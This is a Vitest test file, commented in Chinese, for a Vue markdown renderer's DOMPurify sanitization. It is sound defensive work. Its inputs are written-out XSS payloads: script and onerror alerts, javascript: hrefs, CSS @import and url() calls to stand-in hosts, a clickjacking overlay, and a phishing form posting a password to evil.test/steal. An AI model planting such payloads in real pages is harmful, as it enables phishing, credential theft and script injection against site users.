/**
 * useMarkdownRenderer 的 DOMPurify 消毒策略（XSS-01 / XSS-02）。
 *
 * 決策紀錄 §3：
 *  - 移除 iframe（無功能使用）
 *  - style 屬性只保留在 Shiki 程式碼區塊（pre.shiki 及其子元素），其餘元素一律移除
 *
 * 此檔「不」mock Shiki：Shiki 區塊的測試使用真實 Shiki 輸出，確保不會誤殺高亮樣式。
 */
import { ref } from 'vue'
import { useMarkdownRenderer } from './useMarkdownRenderer'

const render = (markdown: string) => useMarkdownRenderer(ref(markdown)).renderedHtml.value

/** 把輸出 HTML 解析成 DOM 以便斷言結構（而非比對字串細節）。 */
const parse = (html: string) => {
  const root = document.createElement('div')
  root.innerHTML = html
  return root
}

describe('useMarkdownRenderer 消毒：iframe 與危險內容', () => {
  // 每個變體各自 render：happy-dom 的 NodeIterator 在節點被移除後可能略過相鄰兄弟節點，
  // 把多個 iframe 放同一份輸入會讓測試反映模擬 DOM 的怪癖而非 sanitize 設定。
  it.each([
    ['src', '<iframe src="https://evil.example/phish"></iframe>'],
    ['srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ['含屬性與內容', '<iframe width="560" height="315" src="https://www.youtube.com/embed/x" allowfullscreen>fallback</iframe>'],
  ])('<iframe> 應被移除（%s）', (_label, markdown) => {
    const html = render(markdown)

    expect(html).not.toMatch(/<iframe/i)
    expect(html).not.toContain('srcdoc')
    expect(html).not.toContain('evil.example')
    expect(html).not.toContain('youtube.com')
  })

  it('<script> 應被移除', () => {
    const html = render('<script>alert(1)</script>\n\n正文')

    expect(html).not.toMatch(/<script/i)
    expect(html).toContain('正文')
  })

  it('on* 事件屬性應被移除', () => {
    const html = render('<img src="x" onerror="alert(1)">\n\n<a href="https://example.com" onclick="alert(1)">link</a>')

    expect(html).not.toMatch(/\son\w+\s*=/i)
    expect(html).toContain('link')
  })

  it('javascript: href 應被移除（HTML 與 Markdown 連結語法）', () => {
    const root = parse(render('<a href="javascript:alert(1)">html</a>\n\n[md](javascript:alert(1))'))

    const hrefs = Array.from(root.querySelectorAll('[href]')).map((el) => el.getAttribute('href') ?? '')
    expect(hrefs.filter((href) => /^\s*javascript:/i.test(href))).toEqual([])
    // HTML 連結的文字仍保留，只是失去危險 href
    expect(root.textContent).toContain('html')
  })
})

describe('useMarkdownRenderer 消毒：一般元素的 style 一律移除', () => {
  it('style="background:url(javascript:...)" 應被移除', () => {
    const html = render('<p style="background:url(javascript:alert(1))">text</p>')
    const p = parse(html).querySelector('p')

    expect(p).not.toBeNull()
    expect(p!.hasAttribute('style')).toBe(false)
    expect(p!.textContent).toBe('text')
  })

  it('style="position:fixed..."（clickjacking overlay）應被移除', () => {
    const html = render('<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</div>')
    const div = parse(html).querySelector('div')

    expect(div).not.toBeNull()
    expect(div!.hasAttribute('style')).toBe(false)
    expect(div!.textContent).toBe('overlay')
  })

  it('各種元素（span / img / a / table）上的 style 皆被移除', () => {
    const html = render(
      '<span style="color:red">a</span>\n\n' +
        '<img src="https://example.com/a.png" alt="i" style="position:absolute">\n\n' +
        '<a href="https://example.com" style="display:block">b</a>\n\n' +
        '<table style="width:9999px"><tr><td style="color:red">c</td></tr></table>',
    )

    expect(html).not.toMatch(/\sstyle\s*=/i)
  })

  it('不含 Shiki 結構的 <pre><span style> 也不保留 style（不是 pre.shiki 的子元素）', () => {
    const html = render('<pre><span style="--shiki-light:#fff">x</span></pre>')

    expect(html).not.toMatch(/\sstyle\s*=/i)
  })

  it('其他允許屬性不受影響（class / target / rel 仍保留）', () => {
    const html = render('<a href="https://example.com" class="k" target="_blank" rel="noopener" style="color:red">x</a>')
    const a = parse(html).querySelector('a')!

    expect(a.getAttribute('class')).toBe('k')
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener')
    expect(a.hasAttribute('style')).toBe(false)
  })
})

describe('useMarkdownRenderer 消毒：Shiki 區塊的 style 保留', () => {
  /** 與 Shiki（cssVariablePrefix: --shiki-、defaultColor: false）實際輸出同構的結構。 */
  const shikiFixture =
    '<pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e" tabindex="0">' +
    '<code class="language-ts"><span class="line">' +
    '<span style="--shiki-light:#D73A49;--shiki-dark:#F97583">const</span>' +
    '<span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;--shiki-light-font-style:italic;--shiki-dark-font-style:italic"> x</span>' +
    '</span></code></pre>'

  it('Shiki 結構（fixture）：pre.shiki 與其 span 的 style 保留', () => {
    const root = parse(render(shikiFixture))
    const pre = root.querySelector('pre.shiki')!
    const spans = root.querySelectorAll('pre.shiki span[style]')

    expect(pre.getAttribute('style')).toContain('--shiki-light:#24292e')
    expect(pre.getAttribute('style')).toContain('--shiki-dark-bg:#24292e')
    expect(spans.length).toBe(2)
    expect(spans[0].getAttribute('style')).toContain('--shiki-light:#D73A49')
    expect(spans[1].getAttribute('style')).toContain('--shiki-light-font-style:italic')
  })

  it('真實 Shiki 輸出：載入完成後程式碼區塊的高亮 style 仍在', async () => {
    const markdown = ref('```ts\nconst x: number = 1\n```\n\n<p style="position:fixed">outside</p>')
    const { renderedHtml, isReady } = useMarkdownRenderer(markdown)

    await vi.waitFor(() => {
      expect(isReady.value).toBe(true)
      expect(renderedHtml.value).toContain('class="shiki')
    }, { timeout: 20000 })

    const root = parse(renderedHtml.value)
    const pre = root.querySelector('pre.shiki')!
    expect(pre.getAttribute('style')).toMatch(/--shiki-light:#/i)
    expect(root.querySelectorAll('pre.shiki span[style*="--shiki-"]').length).toBeGreaterThan(0)
    // 同一份輸出中，區塊外的 style 仍被移除
    expect(root.querySelector('p')!.hasAttribute('style')).toBe(false)
  }, 30000)

  it('偽造 pre.shiki：非 --shiki-* 變數的 style 仍被移除（防止藉 class 名稱繞過）', () => {
    const html = render(
      '<pre class="shiki" style="position:fixed;top:0;left:0;width:100%;height:100%">' +
        '<code><span style="background:url(javascript:alert(1))">a</span>' +
        '<span style="--shiki-light:url(javascript:alert(1))">b</span>' +
        '<span style="--shiki-light:#fff;position:fixed">c</span></code></pre>',
    )

    expect(html).not.toMatch(/\sstyle\s*=/i)
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toContain('position')
  })
})

/**
 * 審查發現的繞過（真實 Chromium 重現）：
 *  - DOMPurify 預設允許 <style> 元素 → 全版蓋板 / 點擊劫持 / @import 對外請求
 *  - ADD_TAGS input + ADD_ATTR type → 可用的釣魚表單（action 未被剝除）
 * 以實際 DOM 結構斷言（解析後不存在這些元素），而非字串比對。
 */
describe('useMarkdownRenderer 消毒：<style> 元素一律移除', () => {
  const overlay =
    '<p>a</p><style>#real{display:none} .ov{position:fixed;inset:0;z-index:9999} body{background:url(https://evil.test/x)}</style><p class="ov">FAKE LOGIN</p>'

  it.each([
    ['內文夾帶 <style>（全版蓋板）', overlay],
    ['@import 對外請求', 'a\n\n<style>@import url(https://evil.test/imp.css);</style>'],
    ['pre.shiki 內的 <style>', '<pre class="shiki"><style>.x{background:url(https://evil.test/in)}</style></pre>'],
    ['svg 內的 <style>', '<svg><style>.x{background:url(https://evil.test/svg)}</style><circle r="1"/></svg>'],
    ['大小寫混用', '<STYLE>body{display:none}</STYLE>'],
  ])('%s：輸出中不存在任何 style 元素，樣式內容也不外洩成文字', (_label, markdown) => {
    const html = render(markdown)
    const root = parse(html)

    expect(root.querySelectorAll('style').length).toBe(0)
    expect(root.querySelectorAll('svg style, pre style').length).toBe(0)
    expect(html).not.toMatch(/<style/i)
    expect(html).not.toContain('evil.test')
    expect(root.textContent).not.toMatch(/position:\s*fixed|@import|display:\s*none/)
  })

  it('蓋板案例中的 <p class="ov"> 仍存在但不帶 style 元素（只剩普通段落）', () => {
    const root = parse(render(overlay))

    expect(root.querySelector('p.ov')).not.toBeNull()
    expect(root.querySelectorAll('style').length).toBe(0)
  })

  it('真實 Shiki 輸出不依賴 <style> 元素：高亮仍在、輸出無 style 元素', async () => {
    const markdown = ref('```ts\nconst x = 1\n```\n```python\n@d\ndef f(): pass\n```')
    const { renderedHtml, isReady } = useMarkdownRenderer(markdown)

    await vi.waitFor(() => {
      expect(isReady.value).toBe(true)
      expect(renderedHtml.value).toContain('class="shiki')
    }, { timeout: 20000 })

    const root = parse(renderedHtml.value)
    expect(root.querySelectorAll('style').length).toBe(0)
    expect(root.querySelectorAll('pre.shiki span[style*="--shiki-"]').length).toBeGreaterThan(0)
  }, 30000)
})

describe('useMarkdownRenderer 消毒：form 與非 checkbox 的 input', () => {
  const phishing =
    '<form action="https://evil.test/steal" method="post"><input type="password" name="p"><button>Login</button></form>'

  // 一個 render 只放一個會被移除的節點：happy-dom 的 NodeIterator 在節點被移除後可能略過後續兄弟節點，
  // 多個移除目標混在同一份輸入會測到模擬 DOM 的怪癖；組合 payload 另以真實 Chromium 驗證。
  it('釣魚表單：不存在 form / input / button 元素，也沒有 action 屬性', () => {
    const html = render(phishing)
    const root = parse(html)

    expect(root.querySelectorAll('form, input, button, textarea, select').length).toBe(0)
    expect(root.querySelectorAll('[action], [formaction]').length).toBe(0)
    expect(html).not.toContain('evil.test')
    expect(html).not.toMatch(/type="password"/i)
  })

  it.each([
    ['text', '<input type="text" name="u">'],
    ['password', '<input type="password">'],
    ['無 type（預設 text）', '<input name="u">'],
    ['submit', '<input type="submit" value="Login">'],
    ['image', '<input type="image" src="https://evil.test/i.png">'],
    ['hidden', '<input type="hidden" name="t" value="x">'],
    ['file', '<input type="file">'],
  ])('非 checkbox 的 input（%s）整個元素被移除', (_label, markdown) => {
    const root = parse(render(`<p>x</p>${markdown}`))

    expect(root.querySelectorAll('input').length).toBe(0)
  })

  it('checkbox 仍保留（task list 功能不受影響）：type=checkbox、checked 屬性', () => {
    const root = parse(render('- [x] done\n- [ ] todo'))
    const boxes = root.querySelectorAll('input')

    expect(boxes.length).toBe(2)
    boxes.forEach((box) => expect(box.getAttribute('type')).toBe('checkbox'))
    expect(root.querySelectorAll('input[checked]').length).toBe(1)
  })

  it('手寫 HTML 的 type="CHECKBOX"（大小寫）視為 checkbox 保留', () => {
    const root = parse(render('<input type="CHECKBOX" checked disabled>'))

    expect(root.querySelectorAll('input').length).toBe(1)
  })
})
